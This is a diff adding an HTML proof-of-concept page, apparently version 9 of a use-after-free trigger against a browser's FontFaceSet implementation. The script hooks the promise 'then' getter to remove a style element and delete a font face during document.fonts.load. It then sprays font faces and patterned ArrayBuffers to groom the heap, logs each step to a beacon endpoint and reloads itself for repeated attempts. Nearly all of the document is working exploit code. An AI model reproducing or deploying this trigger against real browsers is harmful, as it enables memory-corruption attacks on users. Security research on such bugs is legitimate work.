@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>FontFaceSet UAF v9 (14.10)</title></head>
+<body>
+<textarea id="log" readonly style="width:100%;height:300px"></textarea>
+<script>
+(function(){
+  var logEl = document.getElementById('log');
+  var cfg = { spray: 0, reload: 1, del: 1, rm: 1, layout: 1 };
+  try {
+    var xc = new XMLHttpRequest();
+    xc.open('GET', '/corpus/ffset-config.json?t=' + Date.now(), false);
+    xc.send();
+    var c = JSON.parse(xc.responseText);
+    if (c.spray !== undefined) cfg.spray = c.spray | 0;
+    if (c.reload !== undefined) cfg.reload = c.reload ? 1 : 0;
+    if (c.del !== undefined) cfg.del = c.del ? 1 : 0;
+    if (c.rm !== undefined) cfg.rm = c.rm ? 1 : 0;
+    if (c.layout !== undefined) cfg.layout = c.layout ? 1 : 0;
+    if (c.jsfaces_ig !== undefined) cfg.jsfaces_ig = c.jsfaces_ig | 0;
+    if (c.bufsz !== undefined) cfg.bufsz = c.bufsz | 0;
+    if (c.bufs_ig !== undefined) cfg.bufs_ig = c.bufs_ig | 0;
+  } catch (e) {}
+
+  function syncLog(tag, msg) {
+    var line = 'V9 spray=' + cfg.spray + ' del=' + cfg.del + ' rm=' + cfg.rm + ' lay=' + cfg.layout + ' jsig=' + cfg.jsfaces_ig + ' bufs=' + cfg.bufs_ig + 'x' + cfg.bufsz + ' ' + tag + ' ' + msg;
+    logEl.value += line + '\n';
+    try {
+      var x = new XMLHttpRequest();
+      x.open('POST', '/beacon/' + tag, false);
+      x.send(line);
+    } catch (e) {}
+  }
+
+  var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  syncLog('ADD', 'FontFace a added');
+
+  var fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (fired) return undefined;
+      fired = true;
+      syncLog('GETTER', 'enter');
+      if (cfg.rm) {
+        try {
+          var st = document.getElementById('victim-style');
+          if (st) { st.remove(); syncLog('GETTER', 'style-removed'); }
+        } catch (e) { syncLog('GETTER', 'style-err ' + e); }
+      }
+      if (cfg.layout) {
+        try { void document.body.offsetHeight; syncLog('GETTER', 'layout'); } catch (e) {}
+      }
+      if (cfg.del) {
+        try { document.fonts.delete(this); syncLog('GETTER', 'delete'); } catch (e) {}
+      }
+      if (cfg.jsfaces_ig > 0) {
+        var hold = window.__hold || (window.__hold = []);
+        var made = 0;
+        for (var i = 0; i < cfg.jsfaces_ig; i++) {
+          try {
+            var f = new FontFace('q' + i, 'local(Arial)', { unicodeRange: 'U+0044' });
+            document.fonts.add(f);
+            hold.push(f);
+            made++;
+          } catch (e) { break; }
+        }
+        syncLog('GETTER', 'jsfaces ' + made);
+      }
+      if (cfg.bufs_ig > 0) {
+        var hold2 = window.__bufs || (window.__bufs = []);
+        var sz = cfg.bufsz || 0x100;
+        for (var j = 0; j < cfg.bufs_ig; j++) {
+          try {
+            var ab = new ArrayBuffer(sz);
+            var u = new Uint8Array(ab);
+            for (var k = 0; k < u.length; k++) u[k] = 0x41 + (k & 0xF);
+            hold2.push(ab);
+          } catch (e) { break; }
+        }
+        syncLog('GETTER', 'bufs ' + cfg.bufs_ig + 'x' + sz);
+      }
+      syncLog('GETTER', 'returning');
+      return undefined;
+    },
+    set: function() {}
+  });
+  syncLog('HOOK', 'then hooked');
+
+  if (!document.getElementById('victim-style')) {
+    var st2 = document.createElement('style');
+    st2.id = 'victim-style';
+    st2.textContent = '@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }';
+    document.head.appendChild(st2);
+    syncLog('VICTIM', 'style injected');
+  }
+
+  if (cfg.spray > 0) {
+    var rules = [];
+    for (var i = 0; i < cfg.spray; i++) rules.push('@font-face { font-family: s' + i + '; src: local(Arial); unicode-range: U+0043; }');
+    var sp = document.createElement('style');
+    sp.textContent = rules.join('\n');
+    document.head.appendChild(sp);
+    void document.body.offsetHeight;
+    syncLog('SPRAY', 'rules=' + cfg.spray);
+  }
+
+  syncLog('CALL', 'document.fonts.load');
+  document.fonts.load('1em a, x', 'AB').then(
+    function() { syncLog('RESOLVED', 'no crash'); },
+    function(e) { syncLog('REJECTED', String(e)); }
+  );
+  syncLog('PROMISE', 'load returned');
+
+  setTimeout(function() {
+    syncLog('ALIVE', '1500ms');
+    if (cfg.reload) setTimeout(function() { try { location.reload(); } catch (e) {} }, 700);
+  }, 1500);
+})();
+</script>
+</body></html>
